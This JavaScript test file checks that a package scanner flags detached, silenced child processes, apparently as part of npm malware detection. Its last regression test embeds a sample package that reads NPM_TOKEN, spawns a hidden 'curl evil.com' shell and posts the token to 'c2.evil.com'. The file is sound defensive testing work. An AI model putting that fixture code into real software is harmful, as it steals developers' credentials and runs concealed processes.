const fs = require('fs');
const os = require('os');
const path = require('path');
const { asyncTest, assert, runScanDirect, cleanupTemp } = require('../test-utils');

function makeTempPkg(jsContent, fileName = 'index.js') {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-stealth-'));
  fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-pkg', version: '1.0.0' }));
  fs.writeFileSync(path.join(tmp, fileName), jsContent);
  return tmp;
}

async function runSilentStealthTests() {
  console.log('\n=== SILENT_STEALTH_PROCESS TESTS ===\n');

  // ── Positive: detached + stdio:'ignore' combo ──

  await asyncTest('SILENT_STEALTH: spawn detached + stdio:"ignore" string triggers CRITICAL', async () => {
    const tmp = makeTempPkg(`
const { spawn } = require('child_process');
spawn('node', ['worker.js'], { detached: true, stdio: 'ignore' });
`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'silent_stealth_process');
      assert(t, 'Should detect silent_stealth_process for detached + stdio:"ignore"');
      assert(t.severity === 'CRITICAL', 'Should be CRITICAL, got ' + t.severity);
      // detached_process MUST also still be emitted (compounds depend on it)
      const d = result.threats.find(t => t.type === 'detached_process');
      assert(d, 'detached_process must STILL fire (existing compounds depend on it)');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SILENT_STEALTH: spawn detached + stdio:["ignore","ignore","ignore"] array triggers CRITICAL', async () => {
    const tmp = makeTempPkg(`
const { spawn } = require('child_process');
spawn('node', ['worker.js'], { detached: true, stdio: ['ignore', 'ignore', 'ignore'] });
`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'silent_stealth_process');
      assert(t, 'Should detect silent_stealth_process for array-form stdio:["ignore"x3]');
      assert(t.severity === 'CRITICAL');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SILENT_STEALTH: fork detached + stdio:"ignore" triggers CRITICAL', async () => {
    const tmp = makeTempPkg(`
const { fork } = require('child_process');
fork('worker.js', [], { detached: true, stdio: 'ignore' });
`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'silent_stealth_process');
      assert(t, 'Should detect silent_stealth_process for fork variant');
    } finally { cleanupTemp(tmp); }
  });

  // ── Negative: detached alone (not silent) ──

  await asyncTest('SILENT_STEALTH: detached alone (no stdio) does NOT trigger silent_stealth_process', async () => {
    const tmp = makeTempPkg(`
const { spawn } = require('child_process');
spawn('node', ['worker.js'], { detached: true });
`);
    try {
      const result = await runScanDirect(tmp);
      const ss = result.threats.find(t => t.type === 'silent_stealth_process');
      assert(!ss, 'silent_stealth_process must NOT fire without stdio:"ignore"');
      // But detached_process must still fire
      const d = result.threats.find(t => t.type === 'detached_process');
      assert(d, 'detached_process must still fire');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SILENT_STEALTH: stdio:"ignore" without detached does NOT trigger', async () => {
    const tmp = makeTempPkg(`
const { spawn } = require('child_process');
spawn('node', ['worker.js'], { stdio: 'ignore' });
`);
    try {
      const result = await runScanDirect(tmp);
      const ss = result.threats.find(t => t.type === 'silent_stealth_process');
      assert(!ss, 'silent_stealth_process must NOT fire without detached:true');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SILENT_STEALTH: stdio:"inherit" with detached does NOT trigger silent_stealth (parent sees output)', async () => {
    const tmp = makeTempPkg(`
const { spawn } = require('child_process');
spawn('node', ['worker.js'], { detached: true, stdio: 'inherit' });
`);
    try {
      const result = await runScanDirect(tmp);
      const ss = result.threats.find(t => t.type === 'silent_stealth_process');
      assert(!ss, 'silent_stealth_process must NOT fire when stdio is inherited');
      const d = result.threats.find(t => t.type === 'detached_process');
      assert(d, 'detached_process still fires');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('SILENT_STEALTH: stdio:["pipe","pipe","pipe"] with detached does NOT trigger silent_stealth', async () => {
    const tmp = makeTempPkg(`
const { spawn } = require('child_process');
spawn('node', ['worker.js'], { detached: true, stdio: ['pipe', 'pipe', 'pipe'] });
`);
    try {
      const result = await runScanDirect(tmp);
      const ss = result.threats.find(t => t.type === 'silent_stealth_process');
      assert(!ss, 'silent_stealth_process must NOT fire when stdio array has non-ignore elements');
    } finally { cleanupTemp(tmp); }
  });

  // ── Regression: existing detached_credential_exfil compound must still fire ──

  await asyncTest('SILENT_STEALTH: does NOT break detached_credential_exfil compound (regression guard)', async () => {
    const tmp = makeTempPkg(`
const { spawn } = require('child_process');
const https = require('https');
const token = process.env.NPM_TOKEN;
const child = spawn('sh', ['-c', 'curl evil.com'], { detached: true, stdio: 'ignore' });
child.unref();
https.request({ hostname: 'c2.evil.com', path: '/x' }, () => {}).end(token);
`);
    try {
      const result = await runScanDirect(tmp);
      const compound = result.threats.find(t => t.type === 'detached_credential_exfil');
      assert(compound, 'detached_credential_exfil compound must STILL fire alongside silent_stealth_process');
      const ss = result.threats.find(t => t.type === 'silent_stealth_process');
      assert(ss, 'silent_stealth_process also fires');
    } finally { cleanupTemp(tmp); }
  });
}

module.exports = { runSilentStealthTests };
